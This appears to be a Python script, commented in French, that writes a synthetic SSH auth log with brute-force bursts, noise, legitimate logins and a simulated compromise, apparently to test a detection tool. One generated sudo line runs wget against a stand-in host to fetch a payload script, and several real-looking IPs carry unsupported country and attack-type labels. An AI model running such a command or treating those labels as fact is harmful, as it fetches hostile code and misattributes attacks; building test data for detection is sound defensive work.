"""Génère un gros fichier de logs SSH réaliste avec multiples scénarios d'attaque."""

from datetime import datetime, timedelta
from pathlib import Path
import random


# Scénarios d'attaque réels (IPs documentées publiquement)
ATTACK_SCENARIOS = [
    {
        "ip": "91.134.45.219",     # Russie — brute force massif
        "country": "Russie",
        "count": 45,
        "users": ["root", "admin", "postgres", "mysql", "nginx",
                  "jenkins", "git", "ubuntu", "centos", "debian"],
        "hour": 4,                 # attaque nocturne
    },
    {
        "ip": "218.92.0.220",      # Chine — APT ciblée
        "country": "Chine",
        "count": 65,
        "users": ["root", "admin", "administrator", "sa", "oracle"],
        "hour": 3,
    },
    {
        "ip": "45.155.205.211",    # Pays-Bas — botnet
        "country": "Pays-Bas",
        "count": 38,
        "users": ["root", "admin", "test", "guest", "user"],
        "hour": 1,
    },
    {
        "ip": "185.143.223.47",    # Russie — credential stuffing
        "country": "Russie",
        "count": 52,
        "users": ["admin", "manager", "support", "operator"],
        "hour": 23,
    },
    {
        "ip": "194.169.175.35",    # Pays-Bas — TOR exit node
        "country": "Pays-Bas",
        "count": 28,
        "users": ["root", "postgres", "mysql"],
        "hour": 2,
    },
    {
        "ip": "121.4.21.180",      # Chine — second cluster
        "country": "Chine",
        "count": 71,
        "users": ["root", "admin", "ubuntu", "ec2-user", "ftpuser"],
        "hour": 5,
    },
]

# Tentatives sous le seuil — pour démontrer que le système ne les flagge pas
NOISE_ATTEMPTS = [
    ("192.0.2.10", 2),     # employé qui se trompe
    ("198.51.100.99", 3),  # 3 échecs = pas une attaque
    ("203.0.113.250", 4),
]

# Activité légitime
LEGITIMATE = [
    ("82.66.74.110", "sirtech", 8),    # admin en télétravail
    ("192.168.1.50", "jdupont", 5),    # employé bureau
    ("82.66.74.110", "alice", 3),
    ("10.0.0.42", "bob", 4),
]


def gen_failed(ts: datetime, pid: int, user: str, ip: str) -> str:
    return (f"{ts.strftime('%b %e %H:%M:%S')} webserver01 sshd[{pid}]: "
            f"Failed password for {user} from {ip} port {random.randint(40000, 60000)} ssh2")


def gen_accepted(ts: datetime, pid: int, user: str, ip: str) -> str:
    method = random.choice(["password", "publickey"])
    return (f"{ts.strftime('%b %e %H:%M:%S')} webserver01 sshd[{pid}]: "
            f"Accepted {method} for {user} from {ip} port {random.randint(40000, 60000)} ssh2")


def gen_sudo(ts: datetime, user: str, command: str) -> str:
    return (f"{ts.strftime('%b %e %H:%M:%S')} webserver01 sudo: {user} : "
            f"TTY=pts/{random.randint(0, 5)} ; PWD=/home/{user} ; USER=root ; COMMAND={command}")


def generate_logs():
    """Génère les logs combinés."""
    base = datetime(2026, 6, 1, 0, 0, 0)
    logs = []  # (timestamp, line)

    pid_counter = 10000

    # 1) Scénarios d'attaque massive
    for scenario in ATTACK_SCENARIOS:
        ip = scenario["ip"]
        users = scenario["users"]
        count = scenario["count"]
        hour = scenario["hour"]
        # Date aléatoire ces 5 derniers jours
        day_offset = random.randint(0, 4)
        start = base + timedelta(days=day_offset, hours=hour,
                                  minutes=random.randint(0, 50))
        for i in range(count):
            ts = start + timedelta(seconds=i * random.randint(1, 4))
            user = random.choice(users)
            pid_counter += 1
            logs.append((ts, gen_failed(ts, pid_counter, user, ip)))

    # 2) Bruit (sous le seuil — ne devrait PAS déclencher d'alerte)
    for ip, count in NOISE_ATTEMPTS:
        day_offset = random.randint(0, 4)
        start = base + timedelta(days=day_offset, hours=random.randint(8, 18),
                                  minutes=random.randint(0, 59))
        for i in range(count):
            ts = start + timedelta(seconds=i * 8)
            user = random.choice(["root", "admin", "user"])
            pid_counter += 1
            logs.append((ts, gen_failed(ts, pid_counter, user, ip)))

    # 3) Activité légitime
    for ip, user, count in LEGITIMATE:
        for _ in range(count):
            ts = base + timedelta(
                days=random.randint(0, 4),
                hours=random.randint(8, 19),
                minutes=random.randint(0, 59),
            )
            pid_counter += 1
            logs.append((ts, gen_accepted(ts, pid_counter, user, ip)))
            # Parfois un sudo après
            if random.random() < 0.4:
                ts2 = ts + timedelta(minutes=random.randint(1, 5))
                logs.append((ts2, gen_sudo(ts2, user,
                                            random.choice([
                                                "/usr/bin/apt update",
                                                "/usr/bin/systemctl restart nginx",
                                                "/bin/cat /var/log/auth.log",
                                                "/usr/bin/docker ps",
                                            ]))))

    # 4) Scénario de compromission (brute force + connexion réussie ensuite)
    # IP : 91.134.45.219 a réussi après 25 échecs supplémentaires sur le root
    ts_compromise = base + timedelta(days=2, hours=4, minutes=58)
    pid_counter += 1
    logs.append((ts_compromise, gen_accepted(ts_compromise, pid_counter,
                                              "root", "91.134.45.219")))
    ts_sudo = ts_compromise + timedelta(minutes=2)
    logs.append((ts_sudo, gen_sudo(ts_sudo, "root", "/bin/wget http://malware.example/payload.sh")))

    # 5) Connexions à des heures anormales (entre 02h et 05h)
    for _ in range(6):
        day_offset = random.randint(0, 4)
        hour = random.choice([2, 3, 4])
        ts = base + timedelta(days=day_offset, hours=hour,
                                minutes=random.randint(0, 59))
        user = random.choice(["admin", "root", "operator"])
        ip_internal = "192.168.1." + str(random.randint(10, 100))
        pid_counter += 1
        logs.append((ts, gen_accepted(ts, pid_counter, user, ip_internal)))

    # Tri chronologique
    logs.sort(key=lambda x: x[0])
    return [line for _, line in logs]


if __name__ == "__main__":
    random.seed(42)  # reproductible
    lines = generate_logs()
    output = Path(__file__).parent / "big-auth-log.log"
    output.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"✓ Fichier généré : {output}")
    print(f"  Nombre de lignes : {len(lines)}")
    print(f"  Taille : {output.stat().st_size:,} octets")
